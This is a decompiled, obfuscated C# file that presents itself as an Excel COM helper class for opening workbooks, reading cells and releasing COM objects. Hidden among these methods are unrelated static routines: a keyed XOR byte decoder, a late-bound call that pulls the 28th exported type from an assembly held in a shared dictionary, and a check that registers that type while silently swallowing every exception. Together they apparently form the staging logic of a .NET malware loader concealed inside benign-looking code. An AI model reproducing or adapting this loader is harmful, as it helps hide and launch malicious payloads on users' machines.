using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Mt5;
using Nt9;
using Te19;
using b5C;
using j7R;

namespace d2P6;

public class Xp0o
{
	private Jx5 _oXls;

	private o7C _oWBook;

	private Rq4 _oSheet;

	public Jx5 OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public o7C OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public Rq4 OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public Xp0o()
	{
		_oXls = (Jx5)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void Xz3y(string Yj3e, bool m5LM)
	{
		OWBook = OXls.Workbooks.Open(Yj3e, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = m5LM;
	}

	internal static bool k0HX()
	{
		try
		{
			try
			{
				Type type = (Type)Aw6a(RuntimeHelpers.GetObjectValue(e8P4.mDic["Deep"]));
				if (Operators.CompareString(type.Name, e8P4.mDic[e8P4.tName].ToString(), false) == 0)
				{
					e8P4.mDic.Add(e8P4.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void Tt09(string Ci45)
	{
		OSheet = (Rq4)OWBook.Sheets[Ci45];
	}

	public s2E Wq0k(int Ne9w, int Wb34)
	{
		return (s2E)OSheet.Cells[Ne9w, Wb34];
	}

	public void Wo53(bool j1D5)
	{
		if (OWBook != null)
		{
			OWBook.Close(j1D5, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		Jx5 Cm5x = OXls;
		Ht35(ref Cm5x);
		OXls = Cm5x;
	}

	internal static byte Qt6p(byte Ht0k, byte[] Dd9b, int d8M5, int t0ZG)
	{
		Ht0k = (byte)(Ht0k ^ checked((byte)(Dd9b[unchecked(t0ZG % Dd9b.Length)] ^ ((t0ZG + unchecked(d8M5 % Dd9b.Length)) & d8M5))));
		return Ht0k;
	}

	private static void Ht35<Go21>(ref Go21 Cm5x, bool n3SX = false) where Go21 : class
	{
		if (Cm5x == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(Cm5x))
			{
				if (n3SX)
				{
					Marshal.FinalReleaseComObject(Cm5x);
				}
				else
				{
					Marshal.ReleaseComObject(Cm5x);
				}
			}
		}
		finally
		{
			Cm5x = null;
		}
	}

	internal static object Aw6a(object Zc46)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(Zc46, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
